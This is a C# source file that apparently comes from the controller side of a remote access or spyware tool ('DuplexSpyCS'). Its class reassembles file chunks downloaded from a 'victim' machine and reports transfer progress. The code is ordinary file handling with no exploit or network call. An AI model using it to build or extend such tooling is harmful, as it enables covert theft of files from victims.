using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DuplexSpyCS
{
    public class clsFilePacketWriter
    {
        private readonly string file_path;
        private string remote_file;
        private readonly ConcurrentQueue<(long Index, byte[] Data)> packet_queue;
        private readonly SemaphoreSlim file_lock;
        private bool is_processing;
        public long file_bytes = 0;
        private long file_len;
        private clsVictim v;

        public clsFilePacketWriter(string file_path, string remote_file, long file_len, clsVictim v)
        {
            this.file_path = file_path;
            this.file_len = file_len;
            this.remote_file = remote_file;
            this.v = v;

            packet_queue = new ConcurrentQueue<(long, byte[])>();
            file_lock = new SemaphoreSlim(1, 1);
            is_processing = false;

            if (!File.Exists(file_path))
            {
                File.WriteAllBytes(file_path, new byte[0]); //CREATE NEW EMPTY FILE
            }
        }

        public void EnqueuePacket(long idx, byte[] data)
        {
            packet_queue.Enqueue((idx, data));
            ProcessQueue();
        }

        private void ProcessQueue()
        {
            if (is_processing)
                return;

            is_processing = true;

            //LOCK
            Task.Run(async () =>
            {
                while (packet_queue.TryDequeue(out var packet))
                {
                    await file_lock.WaitAsync();
                    try
                    {
                        WritePacketIntoFile(packet.Index, packet.Data);
                    }
                    finally
                    {
                        file_bytes += packet.Data.Length;
                        CheckCompleted();
                        file_lock.Release();
                    }
                }
                is_processing = false;
            });
        }

        private void WritePacketIntoFile(long idx, byte[] data)
        {
            using (var fs = new FileStream(file_path, FileMode.OpenOrCreate, FileAccess.Write, FileShare.Read))
            {
                fs.Seek(idx, SeekOrigin.Begin);
                fs.Write(data, 0, data.Length);
            }
        }

        private void CheckCompleted()
        {
            bool done = file_bytes >= file_len;
            foreach (Form f in Application.OpenForms)
            {
                if (f is frmFileTransferState && ((frmFileTransferState)f).transfer_type == TransferFileType.Download)
                {
                    ((frmFileTransferState)f).UpdateState(remote_file, done ? "OK" : ((float)(file_bytes * 100 / file_len)).ToString("F2") + " %");
                }
            }
            if (done)
            {
                frmMain.g_FilePacketWriter.Remove(file_path);
            }
        }
    }
}
